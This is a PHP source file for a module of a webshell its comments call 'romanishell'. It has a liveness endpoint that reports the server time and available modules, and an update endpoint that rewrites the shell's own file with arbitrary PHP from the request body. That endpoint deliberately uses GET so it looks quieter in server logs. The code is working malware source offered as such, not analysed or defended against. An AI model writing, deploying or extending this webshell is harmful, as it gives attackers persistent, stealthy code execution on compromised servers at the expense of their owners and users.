<?php

class CoreModule extends BaseModule
{
    /**
     * The only un-timestamped request.
     * Used as healthstatus to see if the server is alive.
     *
     * @returns : {
     *  'time': integer,     <-- timestamp of the server
     *  'modules': [array],  <-- list of available modules
     * }
     *
     * The timestamp will be used in later requests to protect them from
     * replay attacks (with only few seconds of lifetime).
     */
    public function api_healthstatus() {
        global $MODULES;
        header("HTTP/1.1 418 I'm a teapot");
        return jsonback(array(
            'time' => time(),
            'modules' => $MODULES
        ));
    }

    /**
     * This method is used to update the romanishell.
     * It will completely change the content of the webshell.
     *
     * @returns : {
     *  'success': boolean
     * }
     *
     * The PHP content is took from the body of the request.
     * We keep the GET HTTP verb to be quieter in the logs, but pass it a body.
     */
    public function api_update() {
        $body = $this->body();

        if ($body && strpos($body, 'class BaseModule')) {
            return jsonback(array(
                'success' => @file_put_contents(__FILE__, $body)
            ));
        }

        fail();
    }
}
